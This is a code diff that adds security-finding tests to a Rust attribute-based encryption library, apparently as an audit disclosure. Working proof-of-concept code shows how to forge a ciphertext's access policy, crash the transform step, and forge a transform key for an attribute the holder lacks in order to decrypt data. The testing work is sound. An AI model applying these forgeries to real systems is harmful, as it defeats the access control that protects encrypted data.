@@ -458,4 +458,113 @@ mod tests {
         assert_eq!(_match.is_ok(), true);
         assert_eq!(_match.unwrap(), plaintext);
     }
+
+    mod findings {
+        use crate::utils::hash::sha3_hash_fr;
+
+        use super::*;
+
+        // GHW11's `transform` does not check that a ciphertext's policy string matches how the shares
+        // were made. A caller can therefore edit the policy text undetected
+        #[test]
+        fn transform_accepts_forged_policy() {
+            let (pk, msk) = setup();
+
+            let attacker_sk = keygen(&pk, &msk, &[String::from("B")]).unwrap();
+            let (attacker_tk, _) = tkgen(attacker_sk).unwrap();
+
+            let plaintext = b"rabe is an Attribute Based Encryption library, written in Rust";
+            let policy = r#"{"name": "and", "children": [{"name": "B"}, {"name": "C"}]}"#;
+            let ct = encrypt(&pk, policy, PolicyLanguage::JsonPolicy, plaintext).unwrap();
+
+            let honest = transform(ct.clone(), attacker_tk.clone());
+            assert!(honest.is_err(), "key for B does not satisfy B AND C");
+
+            let forged_policy = r#"{"name": "or" , "children": [{"name": "B"}, {"name": "C"}]}"#;
+            assert_eq!(policy.len(), forged_policy.len());
+
+            let mut ct = ct.clone();
+            ct.policy = (forged_policy.to_string(), PolicyLanguage::JsonPolicy);
+
+            assert!(transform(ct, attacker_tk).is_ok());
+        }
+
+        #[test]
+        #[should_panic(expected = "called `Option::unwrap()` on a `None` value")]
+        fn mismatching_ciphertext_can_cause_transform_panic() {
+            use super::*;
+
+            let (pk, msk) = setup();
+            let plaintext =
+                b"rabe is an Attribute Based Encryption library, written in Rust".to_vec();
+            let ct = encrypt(
+                &pk,
+                r#"{"name": "A"}"#,
+                PolicyLanguage::JsonPolicy,
+                &plaintext,
+            );
+            assert!(ct.is_ok());
+            let mut ct = ct.unwrap();
+
+            // Same attributes but new 'shape', meaning `ct.ci_di` has *no* matching
+            // entry
+            ct.policy = (
+                String::from(r#"{"name": "and", "children": [{"name": "A"}, {"name": "A"}]}"#),
+                PolicyLanguage::JsonPolicy,
+            );
+
+            let sk = keygen(&pk, &msk, &[String::from("A")]);
+            assert!(sk.is_some());
+            let sk = sk.unwrap();
+            let keypair = tkgen(sk);
+            assert!(keypair.is_some());
+            let (tk, _) = keypair.unwrap();
+
+            // Panics
+            let _ = transform(ct, tk);
+        }
+
+        #[test]
+        fn tranform_key_forgery() {
+            // NOT a theory break: The paper's security requires a random oracle, which g * Fr(SHA3)
+            // is not. That instead makes the logarithm component publicly computable
+            let (pk, msk) = setup();
+            let plaintext =
+                b"rabe is an Attribute Based Encryption library, written in Rust".to_vec();
+            let ct = encrypt(
+                &pk,
+                r#"{"name": "B"}"#,
+                PolicyLanguage::JsonPolicy,
+                &plaintext,
+            )
+            .unwrap();
+
+            let sk = keygen(&pk, &msk, &[String::from("A")]);
+            assert!(sk.is_some());
+            let sk = sk.unwrap();
+            let keypair = tkgen(sk);
+            assert!(keypair.is_some());
+            let (tk, rk) = keypair.unwrap();
+
+            assert!(transform(ct.clone(), tk.clone()).is_err());
+
+            let h_b = sha3_hash_fr("B");
+            assert!(h_b.is_ok());
+            let h_b = h_b.unwrap();
+            let forged = Ghw11TransformKey {
+                k_z: tk.k_z,
+                l_z: tk.l_z,
+                attr_key_z: vec![Ghw11Attribute {
+                    string: String::from("B"),
+                    k_x: tk.l_z * h_b,
+                }],
+            };
+            assert!(
+                transform(ct.clone(), forged)
+                    .map(|tct| decrypt_out(tct, rk, ct.data))
+                    .flatten()
+                    .is_ok_and(|pt| pt == plaintext)
+            )
+        }
+    }
 }
